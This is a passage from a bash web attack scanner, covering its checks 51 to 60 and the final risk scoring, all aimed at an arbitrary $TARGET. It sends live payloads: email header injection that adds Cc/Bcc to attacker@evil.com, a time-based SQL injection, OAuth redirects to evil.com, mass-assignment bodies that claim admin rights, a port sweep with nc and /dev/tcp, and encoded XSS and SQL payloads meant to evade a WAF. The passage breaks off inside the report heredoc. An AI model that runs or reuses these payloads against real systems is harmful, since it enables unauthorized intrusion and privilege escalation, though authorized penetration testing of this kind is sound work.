# ─── ADV 51. SMTP / EMAIL HEADER INJECTION ───
_section "[ADV 51/60] EMAIL HEADER INJECTION"
run "Testing for SMTP/Email header injection..."
EMAIL_PAYLOADS=(
    "test@example.com%0d%0aCc: attacker@evil.com"
    "test@example.com%0aBcc: attacker@evil.com"
    "test@example.com%0d%0aSubject: Hacked"
    "test@example.com%0d%0aContent-Type: text/html"
    "test@example.com%0d%0a%0d%0aNew body"
)
EMAIL_PARAMS=("email" "to" "from" "cc" "bcc" "reply-to" "sender" "contact" "recipient")
EMAIL_INJ_FOUND=0
for param in "${EMAIL_PARAMS[@]}"; do
    for payload in "${EMAIL_PAYLOADS[@]}"; do
        RESP=$(_curl -X POST -d "$param=$payload" "https://$TARGET/contact" --connect-timeout 10 2>/dev/null)
        if echo "$RESP" | grep -qiE "mail sent|email sent|message sent|thank you"; then
            echo "⚠️  Email header injection via $param: ${payload:0:50}" >> "$SESSION/advanced/email_injection.txt"
            EMAIL_INJ_FOUND=$((EMAIL_INJ_FOUND + 1))
        fi
    done
done
if [ $EMAIL_INJ_FOUND -gt 0 ]; then
    ok "$EMAIL_INJ_FOUND email header injection vector(s) found!"
    ADV_SCORE=$((ADV_SCORE + 15))
else
    info "No email header injection detected"
fi

# ─── ADV 52. DNS-OVER-HTTPS/TLS DETECTION ───
_section "[ADV 52/60] DNS-OVER-HTTPS/TLS DETECTION"
run "Checking for DoH/DoT configuration..."
DoH_ENDPOINTS=(
    "/dns-query"
    "/resolve"
    "/dns"
)
> "$SESSION/recon/doh_endpoints.txt"
for endpoint in "${DoH_ENDPOINTS[@]}"; do
    DOH_STATUS=$(_status "https://$TARGET$endpoint")
    if [ "$DOH_STATUS" = "200" ] || [ "$DOH_STATUS" = "405" ]; then
        echo "[$DOH_STATUS] DoH endpoint: $endpoint" >> "$SESSION/recon/doh_endpoints.txt"
    fi
done
# Test DoH with a query
DOH_TEST=$(curl -s -H "Accept: application/dns-json" "https://$TARGET/dns-query?name=google.com&type=A" --connect-timeout 10 2>/dev/null)
if echo "$DOH_TEST" | grep -qiE "Status.*0|Answer.*google"; then
    echo "⚠️  DNS-over-HTTPS active and responding to queries" >> "$SESSION/recon/doh_endpoints.txt"
    ok "DNS-over-HTTPS endpoint active!"
fi
if [ -s "$SESSION/recon/doh_endpoints.txt" ]; then
    ok "DoH/DoT endpoint(s) discovered"
else
    info "No DoH/DoT endpoints detected"
fi

# ─── ADV 53. SYN STEALTH PORT SCAN ───
_section "[ADV 53/60] SYN STEALTH PORT SCAN"
run "Running fast SYN scan on common ports..."
if command -v nc >/dev/null 2>&1; then
    TOP_PORTS=(21 22 23 25 53 80 110 143 443 445 3306 3389 5432 5900 6379 8080 8443 9200 27017)
    > "$SESSION/network/syn_scan.txt"
    for port in "${TOP_PORTS[@]}"; do
        # Fast SYN check using /dev/tcp if available, fallback to nc
        if timeout 2 bash -c "echo > /dev/tcp/$TARGET/$port" 2>/dev/null; then
            echo "OPEN $port/tcp" >> "$SESSION/network/syn_scan.txt"
        elif nc -z -w2 "$TARGET" "$port" 2>/dev/null; then
            echo "OPEN $port/tcp" >> "$SESSION/network/syn_scan.txt"
        fi
    done
    OPEN_PORTS=$(wc -l < "$SESSION/network/syn_scan.txt" 2>/dev/null | tr -d ' ')
    ok "$OPEN_PORTS open port(s) from SYN scan"
else
    info "nc not available, skipping SYN scan"
fi

# ─── ADV 54. RESPONSE TIMING ANALYSIS ───
_section "[ADV 54/60] RESPONSE TIMING ANALYSIS"
run "Analyzing response times for timing attack surface..."
> "$SESSION/advanced/timing_analysis.txt"
# Baseline timing
BASELINE=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET" --connect-timeout 15 2>/dev/null)
echo "Baseline response time: ${BASELINE}s" >> "$SESSION/advanced/timing_analysis.txt"
# Test with heavy payload (potential DoS indicator)
HEAVY_PAYLOAD=$(python3 -c "print('A'*10000)" 2>/dev/null)
HEAVY_TIME=$(curl -s -o /dev/null -w "%{time_total}" -X POST -d "data=$HEAVY_PAYLOAD" "https://$TARGET" --connect-timeout 20 2>/dev/null)
echo "Heavy payload response time: ${HEAVY_TIME}s" >> "$SESSION/advanced/timing_analysis.txt"
# Check for timing-based SQLi indicator
SLEEP_PAYLOAD="1' AND SLEEP(5)--"
SLEEP_TIME=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/?id=$SLEEP_PAYLOAD" --connect-timeout 20 2>/dev/null)
echo "Sleep payload response time: ${SLEEP_TIME}s" >> "$SESSION/advanced/timing_analysis.txt"
# Analyze results
if python3 -c "
import sys
baseline = float('$BASELINE') if '$BASELINE' else 0
sleep_time = float('$SLEEP_TIME') if '$SLEEP_TIME' else 0
if sleep_time - baseline >= 4:
    sys.exit(0)  # Potential timing-based SQLi
else:
    sys.exit(1)
" 2>/dev/null; then
    echo "⚠️  Potential time-based SQLi: response delayed significantly" >> "$SESSION/advanced/timing_analysis.txt"
    ok "Timing-based SQL injection indicator detected!"
    ADV_SCORE=$((ADV_SCORE + 15))
else
    ok "Timing analysis complete — no significant delays detected"
fi

# ─── ADV 55. CERTIFICATE TRANSPARENCY LOG ANOMALIES ───
_section "[ADV 55/60] CERTIFICATE TRANSPARENCY ANALYSIS"
run "Analyzing Certificate Transparency logs for anomalies..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" --connect-timeout 15 2>/dev/null > "$SESSION/recon/ct_logs_raw.json"
if [ -s "$SESSION/recon/ct_logs_raw.json" ]; then
    # Extract unique issuers
    grep -o '"issuer_name":"[^"]*"' "$SESSION/recon/ct_logs_raw.json" 2>/dev/null | \
        sed 's/"issuer_name":"//;s/"$//' | sort -u > "$SESSION/recon/ct_issuers.txt"
    ISSUER_CNT=$(wc -l < "$SESSION/recon/ct_issuers.txt" 2>/dev/null | tr -d ' ')
    ok "$ISSUER_CNT unique certificate issuer(s) found"
    # Check for non-standard issuers
    grep -viE "let's encrypt|DigiCert|Sectigo|GlobalSign|Cloudflare|Google Trust|Amazon|ISRG" "$SESSION/recon/ct_issuers.txt" > "$SESSION/recon/ct_unusual_issuers.txt" 2>/dev/null
    if [ -s "$SESSION/recon/ct_unusual_issuers.txt" ]; then
        info "Unusual certificate issuers detected"
        cat "$SESSION/recon/ct_unusual_issuers.txt" >> "$SESSION/advanced/ct_anomalies.txt"
    fi
    # Check for recently issued certs (last 7 days)
    RECENT_CERTS=$(grep -c "$(date +%Y-%m)" "$SESSION/recon/ct_logs_raw.json" 2>/dev/null || echo 0)
    if [ "$RECENT_CERTS" -gt 0 ]; then
        ok "$RECENT_CERTS certificate(s) issued this month"
    fi
else
    info "No Certificate Transparency data available"
fi

# ─── ADV 56. OAUTH / OPENID FLOW WEAKNESS ───
_section "[ADV 56/60] OAUTH / OPENID FLOW ANALYSIS"
run "Testing OAuth implementation for weaknesses..."
OAUTH_ENDPOINTS=("/oauth" "/auth" "/login" "/openid" "/connect" "/signin" "/callback" "/authorize" "/token")
> "$SESSION/advanced/oauth_issues.txt"
for endpoint in "${OAUTH_ENDPOINTS[@]}"; do
    EST=$(_status "https://$TARGET$endpoint")
    if [ "$EST" != "000" ] && [ "$EST" != "404" ]; then
        # Test for missing state parameter
        REDIRECT_URI="https://evil.com/callback"
        OAUTH_TEST=$(_curl "https://$TARGET$endpoint?client_id=test&redirect_uri=$REDIRECT_URI&response_type=code" 2>/dev/null)
        if echo "$OAUTH_TEST" | grep -qiE "$REDIRECT_URI|redirecting.*evil"; then
            echo "⚠️  OAuth redirect_uri not validated: $endpoint" >> "$SESSION/advanced/oauth_issues.txt"
        fi
        # Check for PKCE support (absence = vulnerability for public clients)
        PKCE_TEST=$(_curl "https://$TARGET$endpoint?client_id=test&response_type=code&code_challenge=test_challenge" 2>/dev/null)
        if echo "$PKCE_TEST" | grep -qiE "code_challenge|pkce|S256"; then
            echo "PKCE supported at $endpoint" >> "$SESSION/advanced/oauth_issues.txt"
        else
            echo "⚠️  PKCE not enforced at $endpoint" >> "$SESSION/advanced/oauth_issues.txt"
        fi
    fi
done
if grep -q "⚠️" "$SESSION/advanced/oauth_issues.txt" 2>/dev/null; then
    ok "OAuth flow weakness(es) found!"
    ADV_SCORE=$((ADV_SCORE + 15))
else
    info "No OAuth weaknesses detected"
fi

# ─── ADV 57. MASS ASSIGNMENT DETECTION ───
_section "[ADV 57/60] MASS ASSIGNMENT VULNERABILITY"
run "Testing for mass assignment vulnerability..."
MASS_PAYLOADS=(
    '{"id":1,"role":"admin","isAdmin":true}'
    '{"id":1,"admin":true,"role":"administrator"}'
    '{"id":1,"is_admin":true,"privileges":["all"]}'
    '{"id":1,"user_type":"admin","permissions":"*"}'
    '{"id":1,"_method":"PUT","role":"admin"}'
    '{"id":1,"created_at":"2020-01-01","role":"admin"}'
)
MASS_FOUND=0
for payload in "${MASS_PAYLOADS[@]}"; do
    RESP=$(curl -s -X POST -H "Content-Type: application/json" -d "$payload" "https://$TARGET/api/users" --connect-timeout 10 2>/dev/null)
    RESP2=$(curl -s -X POST -H "Content-Type: application/json" -d "$payload" "https://$TARGET/api/register" --connect-timeout 10 2>/dev/null)
    if echo "$RESP$RESP2" | grep -qiE "success|created|updated|token|authenticated|welcome"; then
        echo "⚠️  Mass assignment accepted: ${payload:0:60}" >> "$SESSION/advanced/mass_assignment.txt"
        MASS_FOUND=$((MASS_FOUND + 1))
    fi
done
if [ $MASS_FOUND -gt 0 ]; then
    ok "$MASS_FOUND mass assignment indicator(s) found!"
    ADV_SCORE=$((ADV_SCORE + 15))
else
    info "No mass assignment vulnerability detected"
fi

# ─── ADV 58. DOM CLOBBERING DETECTION ───
_section "[ADV 58/60] DOM CLOBBERING CHECK"
run "Detecting DOM clobbering opportunities..."
# Look for code patterns vulnerable to DOM clobbering
grep -nE 'document\.(getElementById|getElementsByName|getElementsByTagName)\s*\([^)]*\)' "$SESSION/web/index.html" 2>/dev/null | \
    head -10 > "$SESSION/advanced/dom_clobbering.txt"
# Check for non-standard DOM lookups
grep -nE 'window\[[^\]]+\]|document\[[^\]]+\]' "$SESSION/web/index.html" 2>/dev/null | \
    head -5 >> "$SESSION/advanced/dom_clobbering.txt"
# Look for id/name conflicts that enable clobbering
grep -oiE '<(div|a|form|img|input)[^>]*id=["'"'"']?[^"'"'"'> ]+["'"'"']?[^>]*>' "$SESSION/web/index.html" 2>/dev/null | \
    sed 's/.*id=["'"'"']\?\([^"'"'"'> ]*\)["'"'"']\?.*/\1/' | sort -u > "$SESSION/advanced/potential_clobber_ids.txt"
if [ -s "$SESSION/advanced/dom_clobbering.txt" ]; then
    ok "DOM clobbering vectors potentially present"
    ADV_SCORE=$((ADV_SCORE + 5))
else
    info "No obvious DOM clobbering vectors"
fi

# ─── ADV 59. MIME TYPE CONFUSION / XSSI ───
_section "[ADV 59/60] MIME TYPE CONFUSION & XSSI"
run "Testing for MIME type confusion and XSSI..."
MIME_ENDPOINTS=("/api/data" "/api/json" "/data" "/export" "/feed" "/jsonp" "/api/callback")
> "$SESSION/advanced/mime_confusion.txt"
for endpoint in "${MIME_ENDPOINTS[@]}"; do
    # Request with Accept: text/html to see if server responds with wrong type
    MIME_RESP=$(curl -s -I -H "Accept: text/html" "https://$TARGET$endpoint" --connect-timeout 10 2>/dev/null)
    CT_HDR=$(echo "$MIME_RESP" | grep -i "content-type:" | awk -F': ' '{print $2}' | tr -d '\r' | head -1)
    if echo "$CT_HDR" | grep -qiE "json|javascript|xml"; then
        # Check if endpoint is accessible cross-origin without proper headers
        CORS_HDR=$(echo "$MIME_RESP" | grep -i "access-control-allow-origin" | head -1)
        if [ -z "$CORS_HDR" ]; then
            # Check for XSSI protection via X-Content-Type-Options
            XCTO=$(echo "$MIME_RESP" | grep -i "x-content-type-options" | head -1)
            if [ -z "$XCTO" ]; then
                echo "⚠️  MIME confusion: $endpoint serves $CT_HDR without nosniff" >> "$SESSION/advanced/mime_confusion.txt"
            fi
        fi
    fi
done
if [ -s "$SESSION/advanced/mime_confusion.txt" ]; then
    ok "MIME type confusion / XSSI vectors found!"
    ADV_SCORE=$((ADV_SCORE + 10))
else
    info "No MIME type confusion detected"
fi

# ─── ADV 60. ADVANCED PAYLOAD ENCODING & WAF EVASION ───
_section "[ADV 60/60] WAF EVASION PAYLOAD TESTING"
run "Testing WAF evasion with encoded payloads..."
WAF_PAYLOADS=(
    "%3Cscript%3Ealert(1)%3C/script%3E"
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
    "<scr%00ipt>alert(1)</scr%00ipt>"
    "<script>alert&#40;1&#41;</script>"
    "<svg%0aonload=alert(1)>"
    "<iframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22>"
    "';+SELECT+*+FROM+information_schema.tables--"
    "UNI%6FN%20SE%4CECT%20NULL"
    "';/*!50000UNION*/+/*!50000SELECT*/+NULL--"
)
WAF_BLOCKED=0
WAF_BYPASSED=0
for payload in "${WAF_PAYLOADS[@]}"; do
    RESP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/?q=$payload" --connect-timeout 10 2>/dev/null)
    if [ "$RESP_CODE" = "403" ] || [ "$RESP_CODE" = "406" ] || [ "$RESP_CODE" = "501" ]; then
        WAF_BLOCKED=$((WAF_BLOCKED + 1))
    elif [ "$RESP_CODE" = "200" ]; then
        # Payload might have bypassed WAF
        BODY_RESP=$(_curl "https://$TARGET/?q=$payload" 2>/dev/null)
        if echo "$BODY_RESP" | grep -qiE "<script|alert(|onerror|onload"; then
            echo "⚠️  WAF bypassed: ${payload:0:60}" >> "$SESSION/advanced/waf_evasion.txt"
            WAF_BYPASSED=$((WAF_BYPASSED + 1))
        fi
    fi
done
if [ $WAF_BYPASSED -gt 0 ]; then
    ok "$WAF_BYPASSED WAF bypass(es) confirmed!"
    ADV_SCORE=$((ADV_SCORE + 20))
else
    info "WAF blocked $WAF_BLOCKED payloads; no bypasses confirmed"
fi


# ═══════════════════════════════════════════════════════════════════════════
# ═══ FINAL SCORING & REPORTS ═══
# ═══════════════════════════════════════════════════════════════════════════

_section "FINAL SCORING"

TOTAL=$((WEB_SCORE + API_SCORE + AUTH_SCORE + EXPOSURE_SCORE + ADV_SCORE + RT_SCORE))

# Determine risk level
if [ $TOTAL -ge 200 ]; then
    RISK="CRITICAL"
    RISK_COLOR="\e[1;41m"
elif [ $TOTAL -ge 150 ]; then
    RISK="HIGH"
    RISK_COLOR="\e[1;31m"
elif [ $TOTAL -ge 80 ]; then
    RISK="MEDIUM"
    RISK_COLOR="\e[1;33m"
elif [ $TOTAL -ge 40 ]; then
    RISK="LOW"
    RISK_COLOR="\e[1;32m"
else
    RISK="MINIMAL"
    RISK_COLOR="\e[1;36m"
fi

# Count findings per category
FIND_SENSITIVE=$(wc -l < "$SESSION/advanced/sensitive_files.txt" 2>/dev/null | tr -d ' ' || echo 0)
FIND_SECRETS=$(grep -c '.' "$SESSION/advanced/js_secrets.txt" 2>/dev/null || echo 0)
FIND_SQLI=$(grep -c '⚠️' "$SESSION/advanced/sqli_found.txt" 2>/dev/null || echo 0)
FIND_XSS=$(grep -c '⚠️' "$SESSION/advanced/xss_found.txt" 2>/dev/null || echo 0)
FIND_SSRF=$(grep -c '⚠️' "$SESSION/advanced/ssrf_found.txt" 2>/dev/null || echo 0)
FIND_CMDI=$(grep -c '⚠️' "$SESSION/advanced/cmdi_found.txt" 2>/dev/null || echo 0)
FIND_LFI=$(grep -c '⚠️' "$SESSION/advanced/lfi_found.txt" 2>/dev/null || echo 0)
FIND_CORS=$(grep -c '⚠️' "$SESSION/advanced/cors_vulns.txt" 2>/dev/null || echo 0)
FIND_REDIRECT=$(grep -c '⚠️' "$SESSION/advanced/open_redirects.txt" 2>/dev/null || echo 0)
FIND_GIT=$(test -f "$SESSION/advanced/git_head.txt" && grep -c "ref:" "$SESSION/advanced/git_head.txt" 2>/dev/null || echo 0)
FIND_TAKEOVER=$(grep -c '⚠️' "$SESSION/advanced/subdomain_takeover.txt" 2>/dev/null || echo 0)
FIND_SSTI=$(grep -c '⚠️' "$SESSION/advanced/ssti_found.txt" 2>/dev/null || echo 0)
FIND_XXE=$(grep -c '⚠️' "$SESSION/advanced/xxe_test.txt" 2>/dev/null || echo 0)
FIND_PROTO=$(grep -c '⚠️' "$SESSION/advanced/proto_pollution.txt" 2>/dev/null || echo 0)
FIND_CLICKJACK=$(grep -c '⚠️' "$SESSION/advanced/clickjacking.txt" 2>/dev/null || echo 0)
FIND_HOST_HDR=$(grep -c '⚠️' "$SESSION/advanced/host_header_vulns.txt" 2>/dev/null || echo 0)
FIND_HEARTBLEED=$(test -f "$SESSION/network/heartbleed.txt" && wc -l < "$SESSION/network/heartbleed.txt" 2>/dev/null | tr -d ' ' || echo 0)
FIND_SMUGGLE=$(test -f "$SESSION/advanced/http_smuggle.txt" && wc -l < "$SESSION/advanced/http_smuggle.txt" 2>/dev/null | tr -d ' ' || echo 0)
FIND_CRLF=$(grep -c '⚠️' "$SESSION/advanced/crlf_found.txt" 2>/dev/null || echo 0)
FIND_NOSQL=$(grep -c '⚠️' "$SESSION/advanced/nosql_found.txt" 2>/dev/null || echo 0)
FIND_LDAP=$(grep -c '⚠️' "$SESSION/advanced/ldap_injection.txt" 2>/dev/null || echo 0)
FIND_XPATH=$(grep -c '⚠️' "$SESSION/advanced/xpath_injection.txt" 2>/dev/null || echo 0)
FIND_EMAIL_INJ=$(grep -c '⚠️' "$SESSION/advanced/email_injection.txt" 2>/dev/null || echo 0)
FIND_DESER=$(grep -c '⚠️' "$SESSION/advanced/deserialization.txt" 2>/dev/null || echo 0)
FIND_TIMING=$(grep -c '⚠️' "$SESSION/advanced/timing_analysis.txt" 2>/dev/null || echo 0)
FIND_CACHE_DEC=$(grep -c '⚠️' "$SESSION/advanced/cache_deception.txt" 2>/dev/null || echo 0)
FIND_WAF_BYPASS=$(grep -c '⚠️' "$SESSION/advanced/waf_evasion.txt" 2>/dev/null || echo 0)
FIND_MASS_ASSIGN=$(grep -c '⚠️' "$SESSION/advanced/mass_assignment.txt" 2>/dev/null || echo 0)
FIND_OAUTH=$(grep -c '⚠️' "$SESSION/advanced/oauth_issues.txt" 2>/dev/null || echo 0)

# ─── TXT REPORT ───
cat > "$SESSION/reports/report.txt" <<EOF
